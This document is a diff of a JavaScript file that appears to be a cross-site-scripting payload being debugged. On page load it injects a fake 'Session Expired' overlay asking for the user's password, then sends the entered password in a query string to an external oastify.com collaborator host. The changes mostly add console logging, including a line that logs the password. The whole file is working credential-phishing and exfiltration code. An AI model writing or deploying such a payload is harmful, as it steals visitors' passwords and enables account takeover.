@@ -1,6 +1,12 @@
+console.log("Script started"); // Confirm the script runs at all
+
 window.addEventListener('load', function() {
+    console.log("Window loaded"); // Confirm the load event fires
+    
     setTimeout(function() {
-        // Create the session expired prompt
+        console.log("Timeout triggered"); // Confirm the timeout executes
+        
+        // Create and append the message div
         let message = document.createElement('div');
         message.style.position = 'fixed';
         message.style.top = '30%';
@@ -10,7 +16,7 @@ window.addEventListener('load', function() {
         message.style.padding = '20px';
         message.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
         message.style.zIndex = '9999';
-        message.style.display = 'block'; // Added for safety
+        message.style.display = 'block';
         message.innerHTML = `
             <h2>Session Expired</h2>
             <p>Please re-enter your password:</p>
@@ -19,23 +25,27 @@ window.addEventListener('load', function() {
         `;
         
         document.body.appendChild(message);
-
-        // Add event listener for the submit button using fetch
+        console.log("Prompt appended to DOM"); // Confirm the div is added
+        
+        // Add the submit handler
         document.getElementById('submit').addEventListener('click', function() {
+            console.log("Submit clicked"); // Confirm the click works
             let password = document.getElementById('password').value;
             if (password) {
+                console.log("Sending fetch with password:", password);
                 fetch(`https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`, {
-                    method: 'GET', // Matches the original behavior of an image request
-                    mode: 'no-cors' // Use this if you don’t need the response, just to send the request
+                    method: 'GET',
+                    mode: 'no-cors'
                 })
                 .then(() => {
-                    message.innerHTML = "<p>Loading...</p>"; // Update UI after successful request
+                    console.log("Fetch succeeded");
+                    message.innerHTML = "<p>Loading...</p>";
                 })
                 .catch(error => {
-                    console.error("Fetch error:", error); // Log any issues
-                    message.innerHTML = "<p>Error occurred. Please try again.</p>";
+                    console.error("Fetch failed:", error);
+                    message.innerHTML = "<p>Error occurred.</p>";
                 });
             }
         });
-    }, 3000); // Delay the prompt for 3 seconds
+    }, 3000);
 });
